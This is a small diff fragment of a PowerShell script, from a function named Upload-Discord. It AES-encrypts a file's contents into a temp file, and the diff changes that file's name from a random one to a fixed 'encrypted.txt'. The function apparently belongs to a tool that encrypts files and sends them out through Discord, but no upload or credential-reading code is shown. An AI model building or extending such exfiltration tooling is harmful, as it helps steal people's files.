@@ -514,7 +514,7 @@ function Upload-Discord {
             $encryptor = $aes.CreateEncryptor()
 
             # Encrypt the file content in a memory stream
-            $encryptedFilePath = Join-Path $env:temp "encrypted_$(Get-Random).txt"
+            $encryptedFilePath = Join-Path $env:temp "encrypted.txt"
             $fileContent = [System.IO.File]::ReadAllBytes($file)
             $encryptedContent = $encryptor.TransformFinalBlock($fileContent, 0, $fileContent.Length)
             [System.IO.File]::WriteAllBytes($encryptedFilePath, $encryptedContent)
